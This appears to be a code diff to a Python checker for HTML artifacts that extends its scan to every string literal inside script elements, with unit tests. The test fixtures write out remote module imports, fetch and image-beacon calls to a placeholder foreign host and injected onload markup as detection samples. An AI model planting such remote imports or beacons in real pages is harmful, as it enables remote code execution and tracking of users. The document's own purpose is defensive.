@@ -3605,6 +3605,109 @@ _CALL_SITE_RE = re.compile(
 _STRING_LITERAL_RE = re.compile(r"'([^'\n]*)'|\"([^\"\n]*)\"|`([^`\n]*)`")
 CALL_ARGUMENT_WINDOW = 400
 
+# A ``script`` element is a raw-text element: its content ends at the first
+# ``</script``, and no nesting is possible, so the body is delimited rather than
+# parsed. Matching it is what lets the whole body be scanned instead of only the
+# window after a recognized call.
+_SCRIPT_BODY_RE = re.compile(r"(?is)(<script\b[^>]*>)(.*?)(</script\s*>)")
+
+# XML namespace identifiers. These are compared as strings by a parser and are
+# never fetched, so a namespace constant assigned in script is not a reference.
+# The canonical head block itself assigns the SVG namespace when it builds the
+# brand mark, which is exactly the shape the literal scan below would otherwise
+# report — a false positive on the kit's own shipped code.
+NAMESPACE_URIS: frozenset[str] = frozenset(
+    {
+        "http://www.w3.org/2000/svg",
+        "http://www.w3.org/1999/xlink",
+        "http://www.w3.org/1999/xhtml",
+    }
+)
+
+
+def _script_bodies(text: str) -> list[str]:
+    return [match.group(2) for match in _SCRIPT_BODY_RE.finditer(text)]
+
+
+def _script_markup_literals(text: str) -> list[str]:
+    """Every markup-shaped string literal inside a script element.
+
+    Markup assigned to a string — the ``innerHTML`` case — is never seen by an
+    HTML parser reading the document, so both the reference scan and the construct
+    checks are blind to it unless it is parsed separately. Shape is judged by the
+    presence of both angle brackets, which is deliberately loose: over-parsing a
+    literal that is not markup finds no elements and costs nothing, while
+    under-parsing one that is leaves a construct unreachable.
+    """
+    literals: list[str] = []
+    for body in _script_bodies(text):
+        for literal in _STRING_LITERAL_RE.finditer(body):
+            value = next((group for group in literal.groups() if group is not None), "").strip()
+            if "<" in value and ">" in value:
+                literals.append(value)
+    return literals
+
+
+def _without_script_bodies(text: str) -> str:
+    """``text`` with every script body blanked, offsets preserved.
+
+    The call-site pass and this module's script pass would otherwise both read a
+    literal inside a script and report one defect twice. Blanking gives each pass
+    exactly one jurisdiction: script bodies here, everything else — ``<style>``
+    content, style attributes, event-handler attributes — there. Event handlers
+    are attribute values, not script bodies, so they stay with the call-site pass.
+    """
+    return _SCRIPT_BODY_RE.sub(lambda m: m.group(1) + (" " * len(m.group(2))) + m.group(3), text)
+
+
+def _script_references(label: str, text: str) -> list[_Reference]:
+    """Every URL-shaped string literal inside a script element.
+
+    The call-site pass read only string literals appearing between the parens of
+    eight fixed call forms, which left the ordinary ways a script names a
+    destination invisible:
+
+    * a static module import — ``import {x} from "https://host/m.js"`` — plus the
+      bare, ``export … from``, and import-map forms. None matches a call form,
+      because none is a call; and the shipped policy declaration carries no
+      ``script-src`` or ``default-src``, so nothing backed it up either. That is
+      remote code execution, not a subresource.
+    * a URL bound to a variable and used later — ``var E = "https://host/x";
+      fetch(E)`` — where the call form matches but its argument is an identifier.
+    * an assignment rather than a call — ``img.src = "https://host/b"``.
+    * markup written into a string and injected — ``el.innerHTML = '<img
+      src="https://host/m.png">'`` — which reaches no HTML parser, so no element
+      pass ever sees it.
+
+    Scanning every literal covers all four with one rule instead of enumerating
+    call forms, which is the same default-deny argument E0 makes for attributes.
+    A literal that is URL-shaped is a reference; the host allowlist then decides.
+
+    A literal is not always itself a URL. ``innerHTML`` is assigned *markup*, and
+    the kit's own head block assigns a four-kilobyte SVG that way. Treating such a
+    literal as one URL both misreports it and trips E6's repertoire rule on the
+    surrounding markup. So a markup-shaped literal is parsed as markup and run
+    through the element pass — which is also what makes the ``xmlns`` exemption
+    apply to it, exactly as it does in the document.
+    """
+    references: list[_Reference] = []
+    for number, body in enumerate(_script_bodies(text), start=1):
+        where = f"<script> literal (block {number})"
+        for literal in _STRING_LITERAL_RE.finditer(body):
+            value = next((group for group in literal.groups() if group is not None), "").strip()
+            if not value or value in NAMESPACE_URIS:
+                continue
+            if "<" in value and ">" in value:
+                # Markup injected as a string. Parse it and reuse the element
+                # pass, so an attribute here is judged exactly as one written
+                # into the document would be.
+                inner, unrecognized = _element_references(f"{label}: {where}", _elements(value))
+                references.extend(inner)
+                continue
+            if _url_shaped(value):
+                references.append(_Reference(label, where, value, RESOURCE, True, ()))
+    return references
+
 _META_REFRESH_URL_RE = re.compile(r"(?i)\burl\s*=\s*")
 
 
@@ -3796,7 +3899,11 @@ def _references(gallery_root: Path) -> tuple[list[_Reference], list[str]]:
             parsed, reported = _element_references(label, elements)
             references.extend(parsed)
             references.extend(_decoded_style_references(label, elements, text))
+            references.extend(_script_references(label, text))
             unrecognized.extend(reported)
+            # Script bodies belong to the pass above; blanking them keeps the
+            # call-site pass from reporting the same literal a second time.
+            text = _without_script_bodies(text)
         references.extend(_text_references(label, text))
     return references, unrecognized
 
@@ -4194,6 +4301,98 @@ class ExternalReferenceFixtureTests(ExternalReferenceFixtureCase):
         self.write_document('<div style="background:url(https://evil.example/z.png)"></div>')
 
         self.assertEqual(len(check_e1(self.gallery)), 1)
+
+    # -- script bodies: every literal, not only a call's argument --
+
+    def test_a_static_module_import_is_scanned(self) -> None:
+        """A static import is not a call, so no call-form pattern matched it.
+
+        With no ``script-src`` or ``default-src`` in the shipped policy either,
+        this was remote code execution reachable with nothing reported.
+        """
+        self.write_document(
+            f'<script type="module">import {{x}} from "https://{FIXTURE_FOREIGN_HOST}/m.js";</script>'
+        )
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_a_bare_and_reexport_module_form_are_scanned(self) -> None:
+        self.write_document(f'<script type="module">import "https://{FIXTURE_FOREIGN_HOST}/s.js";</script>')
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+        self.write_document(f'<script type="module">export {{y}} from "https://{FIXTURE_FOREIGN_HOST}/e.js";</script>')
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_an_import_map_is_scanned(self) -> None:
+        self.write_document(
+            f'<script type="importmap">{{"imports":{{"a":"https://{FIXTURE_FOREIGN_HOST}/a.js"}}}}</script>'
+        )
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_a_url_bound_to_a_variable_is_scanned(self) -> None:
+        """The call form matched; its argument was an identifier, not a literal."""
+        self.write_document(f'<script>var E = "https://{FIXTURE_FOREIGN_HOST}/x"; fetch(E);</script>')
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_a_url_assigned_rather_than_called_is_scanned(self) -> None:
+        self.write_document(f'<script>new Image().src = "https://{FIXTURE_FOREIGN_HOST}/beacon";</script>')
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_markup_injected_from_a_script_string_is_parsed(self) -> None:
+        """It reaches no HTML parser reading the document, so it is parsed here.
+
+        The kit's own head block builds the brand mark this way, which is what
+        makes this a real position rather than a hypothetical one.
+        """
+        self.write_document(
+            f'<script>el.innerHTML = \'<img src="https://{FIXTURE_FOREIGN_HOST}/m.png">\';</script>'
+        )
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_a_construct_injected_from_a_script_string_is_reported(self) -> None:
+        """Not a reference — a prohibited construct, so group J owns it."""
+        self.write_document("<script>el.innerHTML = '<svg onload=\"go()\"></svg>';</script>")
+
+        self.assertReports(check_j3(self.gallery), "onload")
+
+    def test_a_call_argument_in_script_is_reported_exactly_once(self) -> None:
+        """One defect, one report.
+
+        A literal inside a call is visible to both the call-site pass and the
+        script pass. Blanking script bodies before the call-site pass runs gives
+        each exactly one jurisdiction; without it this reference is named twice
+        and a reader counts two problems where there is one.
+        """
+        self.write_document(f'<script>fetch("https://{FIXTURE_FOREIGN_HOST}/x");</script>')
+
+        self.assertEqual(len(check_e1(self.gallery)), 1)
+
+    def test_an_event_handler_attribute_stays_with_the_call_site_pass(self) -> None:
+        """Blanking must not reach attribute values.
+
+        An event handler is an attribute, not a script body, so the call-site
+        pass keeps it — blanking script bodies too broadly would have silently
+        dropped this position.
+        """
+        self.write_document(f'<div onclick="fetch(\'https://{FIXTURE_FOREIGN_HOST}/y\')"></div>')
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_a_namespace_constant_in_script_is_not_a_reference(self) -> None:
+        """The shipped block assigns exactly this, so a false positive here is a
+        false positive on the kit's own code."""
+        self.write_document('<script>var NS = "http://www.w3.org/2000/svg";</script>')
+
+        self.assertEqual([f for _, check in GROUP_E_CHECKS for f in check(self.gallery)], [])
+
+    def test_an_allowlisted_host_in_script_stays_clean(self) -> None:
+        self.write_document('<script>var F = "https://fonts.gstatic.com/a.woff2";</script>')
+
+        self.assertEqual([f for _, check in GROUP_E_CHECKS for f in check(self.gallery)], [])
 
     def test_e0_accepts_a_namespace_declaration(self) -> None:
         """Inline SVG is the standard iconography for a self-contained artifact.
@@ -4690,6 +4889,34 @@ def _construct_documents(gallery_root: Path) -> list[tuple[str, str, list[_Eleme
     if head.is_file():
         text = _document_text(head)
         documents.append((_label(gallery_root, head), text, _elements(text)))
+    # Markup assigned to a string inside a script reaches no HTML parser, so the
+    # document pass above cannot see it — an ``on*`` handler or a ``base`` element
+    # written that way was invisible to every construct check. The kit's own head
+    # block builds the brand mark exactly this way, which is what makes it a real
+    # position rather than a hypothetical one.
+    return documents
+
+
+def _construct_documents_with_script_markup(
+    gallery_root: Path,
+) -> list[tuple[str, str, list[_Element]]]:
+    """``_construct_documents`` plus markup parsed out of script string literals.
+
+    Read by the construct checks J1-J5 only. Markup assigned to a string reaches
+    no HTML parser, so an ``on*`` handler or a ``base`` element written that way
+    was invisible to every check — and the kit's own head block builds the brand
+    mark exactly this way, which makes it a real position rather than a
+    hypothetical one.
+
+    NOT read by J6, J9 or J10. Those ask whether a *document* carries a policy
+    declaration and what it says; a markup fragment is not a document and has no
+    policy of its own, so asking would report every artifact that injects any
+    markup at all.
+    """
+    documents = list(_construct_documents(gallery_root))
+    for label, text, _ in list(documents):
+        for number, markup in enumerate(_script_markup_literals(text), start=1):
+            documents.append((f"{label}: <script> markup literal {number}", markup, _elements(markup)))
     return documents
 
 
@@ -4739,7 +4966,7 @@ def check_j1(gallery_root: Path) -> list[str]:
     return [
         f"{label}: carries a '{BASE_ELEMENT}' element, which redefines what every relative reference "
         "resolves to and leaves no foreign host in any position group E scans"
-        for label, _, elements in _construct_documents(gallery_root)
+        for label, _, elements in _construct_documents_with_script_markup(gallery_root)
         for element in elements
         if element.tag == BASE_ELEMENT
     ]
@@ -4757,7 +4984,7 @@ def check_j2(gallery_root: Path) -> list[str]:
     return [
         f"{label}: carries the scheme-relative reference '{match.group(0)}', which resolves against the "
         "document's own scheme rather than a network one"
-        for label, text, _ in _construct_documents(gallery_root)
+        for label, text, _ in _construct_documents_with_script_markup(gallery_root)
         for match in _SCHEME_RELATIVE_TEXT_RE.finditer(text)
     ]
 
@@ -4773,7 +5000,7 @@ def check_j3(gallery_root: Path) -> list[str]:
     return [
         f"{label}: <{element.tag}> carries the event-handler attribute '{name}', which is executable "
         "content in a position no resource-load scan reads"
-        for label, _, elements in _construct_documents(gallery_root)
+        for label, _, elements in _construct_documents_with_script_markup(gallery_root)
         for element in elements
         for name, _value in element.attributes
         if name.startswith(EVENT_HANDLER_PREFIX)
@@ -4786,7 +5013,7 @@ def check_j4(gallery_root: Path) -> list[str]:
     return [
         f"{label}: <{element.tag}> carries a '{SRCDOC_ATTRIBUTE}' attribute, which is a complete nested "
         "document written inside an attribute value"
-        for label, _, elements in _construct_documents(gallery_root)
+        for label, _, elements in _construct_documents_with_script_markup(gallery_root)
         for element in elements
         for name, _value in element.attributes
         if name == SRCDOC_ATTRIBUTE
@@ -4801,7 +5028,7 @@ def check_j5(gallery_root: Path) -> list[str]:
     working would otherwise carry a beacon with it.
     """
     failures: list[str] = []
-    for label, _, elements in _construct_documents(gallery_root):
+    for label, _, elements in _construct_documents_with_script_markup(gallery_root):
         for element in elements:
             names = {name for name, _ in element.attributes}
             if element.tag == FORM_ELEMENT and ACTION_ATTRIBUTE in names:
